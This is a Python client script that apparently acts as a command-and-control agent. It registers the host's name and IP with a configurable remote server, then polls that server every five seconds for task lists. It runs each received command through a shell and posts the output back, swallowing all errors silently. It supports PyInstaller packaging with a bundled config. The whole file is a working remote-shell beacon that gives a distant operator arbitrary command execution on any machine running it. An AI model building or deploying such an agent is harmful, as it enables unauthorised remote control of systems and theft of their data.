import requests
import time
import json
import os
import sys
import socket
from datetime import datetime
import subprocess
import ast

# Check if in pyinstaller, or running localy
if getattr(sys, 'frozen', False):
    config_path = os.path.join(sys._MEIPASS, 'config.json')
else:
    config_path = 'config.json'

try:
    with open(config_path) as f:
        config = json.load(f)

    ip = config['ip']
    port = config['port']
    name = config['name']
except:
    # read from argv
    ip = sys.argv[1]
    port = sys.argv[2]
    name = sys.argv[3]

client_id = None

print(f"IP: {ip}")
print(f"Port: {port}")
print(f"Name: {name}")


def register_client():

    url = f"http://{ip}:{port}/register_client"
    hostname = socket.gethostname()
    host_ip = socket.gethostbyname(hostname)
    data = {"name": hostname, "ip": host_ip, "date": datetime.now().isoformat()}
    response = requests.post(url, json=data)
    print(f"Response: {response.text}")
    global client_id
    client_id = response.json().get('client_id')
    global access_token
    access_token = response.json().get('access_token')
    return response.status_code


def check_status(ip, port):
    global client_id
    # TODO: Change the URL to use the client_id
    url = f"http://{ip}:{port}/status/{client_id}"
    headers = {'Authorization': f'Bearer {access_token}'}
    #url = f"http://{ip}:{port}/status/1"
    while True:
        try:
            res = requests.get(url, headers=headers)
            response = res.json()
            if response is not None:
                for task in response:
                    actions = json.loads(task['actions'])
                    print("Actions: ", actions)
                    command_outputs = {}
                    for num, action in actions.items():
                        result = subprocess.run(action, shell=True, capture_output=True, text=True, encoding='cp866')

                        command_outputs[num] = result.stdout

                    result_url = f"http://{ip}:{port}/result/{task['id']}"
                    # TODO do we need run_id?
                    result_data = {"client_id": client_id, "run_id": task['run_id'], "results": command_outputs}
                    result_response = requests.post(result_url, json=result_data, headers=headers)
        except:
            pass
        time.sleep(5)


if register_client() == 200:
    check_status(ip, port)
else:
    print("Failed to register client.")